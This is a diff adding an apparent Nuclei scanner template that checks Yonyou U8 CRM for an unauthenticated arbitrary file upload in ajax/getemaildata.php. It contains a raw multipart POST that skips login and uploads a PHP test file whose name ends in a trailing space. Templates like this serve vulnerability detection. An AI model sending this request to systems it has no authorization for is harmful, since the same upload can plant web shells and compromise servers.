@@ -1,0 +1,32 @@
+id: yonyou-U8CRM-getemaildata-upload
+info:
+  name: yonyou-U8CRM-getemaildata-upload
+  author: apple
+  severity: critical
+  description: 用友U8 crm客户关系管理 ajax/getemaildata.php任意文件上传漏洞
+  reference:
+    - https://mp.weixin.qq.com/s/ErOy85ItwPe2gkxFHEVInQ
+  tags: yonyou
+http:
+  - raw:
+      - |-
+        POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+        Connection: close
+        Content-Length: 205
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundarykS5RKgl8t3nwInMQ
+        Content-Disposition: form-data; name="file"; filename="ceshi.php "
+        Content-Type: text/plain
+
+        <?php echo md5(1234);?>
+
+        ------WebKitFormBoundarykS5RKgl8t3nwInMQ
+    matchers:
+      - type: word
+        part: body
+        words:
+          - success
